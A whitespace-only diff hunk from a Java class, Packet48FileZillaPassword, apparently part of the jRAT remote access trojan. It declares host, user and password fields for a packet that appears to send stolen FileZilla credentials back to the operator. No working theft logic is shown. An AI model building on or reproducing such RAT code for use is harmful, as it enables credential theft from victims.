@@ -4,9 +4,8 @@ import java.io.DataOutputStream;
 
 import pro.jrat.common.io.StringWriter;
 
-
 public class Packet48FileZillaPassword extends AbstractOutgoingPacket {
-	
+
 	private String host;
 	private String user;
 	private String password;
